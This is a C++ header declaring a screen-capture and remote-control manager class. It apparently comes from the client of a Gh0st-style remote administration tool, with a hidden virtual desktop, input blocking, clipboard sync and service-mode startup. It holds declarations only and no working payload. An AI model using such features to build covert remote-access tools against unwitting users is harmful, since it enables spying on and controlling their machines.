// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
#define AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "ScreenSpy.h"
#include "ScreenCapture.h"

bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName);

bool IsWindows8orHigher();

BOOL IsRunningAsSystem();

class IOCPClient;

struct UserParam;

class CScreenManager : public CManager
{
public:
    CScreenManager(IOCPClient* ClientObject, int n, void* user = nullptr);
    virtual ~CScreenManager();
    HANDLE  m_hWorkThread;

    void InitScreenSpy();
    static DWORD WINAPI WorkThreadProc(LPVOID lParam);
    VOID SendBitMapInfo();
    VOID OnReceive(PBYTE szBuffer, ULONG ulLength);

    ScreenCapture* m_ScreenSpyObject;
    VOID SendFirstScreen();
    const char* GetNextScreen(ULONG &ulNextSendLength);
    VOID SendNextScreen(const char* szBuffer, ULONG ulNextSendLength);

    VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
    UserParam *m_pUserParam = NULL;
    INT_PTR m_ptrUser;
    HDESK g_hDesk;
    BOOL m_isGDI;
    std::string m_DesktopID;
    BOOL  m_bIsWorking;
    BOOL  m_bIsBlockInput;
    BOOL SendClientClipboard(BOOL fast);
    VOID UpdateClientClipboard(char *szBuffer, ULONG ulLength);

    std::string m_hash;
    std::string m_hmac;
    CONNECT_ADDRESS *m_conn = nullptr;
    void SetConnection(CONNECT_ADDRESS* conn)
    {
        m_conn = conn;
    }
    bool IsRunAsService() const
    {
        if (m_conn && (m_conn->iStartup == Startup_GhostMsc || m_conn->iStartup == Startup_TestRunMsc))
            return true;
        static BOOL is_run_as_system = IsRunningAsSystem();
        return is_run_as_system;
    }
    // 获取当前活动桌面（带写权限，用于锁屏等安全桌面）
    // 使用独立的静态变量避免与WorkThreadProc的g_hDesk并发冲突
    HDESK s_inputDesk = NULL;
    clock_t s_lastCheck = 0;
    DWORD s_lastThreadId = 0;

    bool SwitchScreen();
    bool RestartScreen();
    virtual BOOL OnReconnect();
    uint64_t            m_DlgID = 0;
    BOOL                m_SendFirst = FALSE;
    int                 m_nMaxFPS = 20;
    // 虚拟桌面
    BOOL                m_virtual;
    POINT               m_point;
    POINT               m_lastPoint;
    BOOL                m_lmouseDown;
    HWND                m_hResMoveWindow;
    LRESULT             m_resMoveType;
    BOOL				m_rmouseDown;      // 标记右键是否按下
    POINT				m_rclickPoint;     // 右键点击坐标
    HWND				m_rclickWnd;	   // 右键窗口
};

#endif // !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
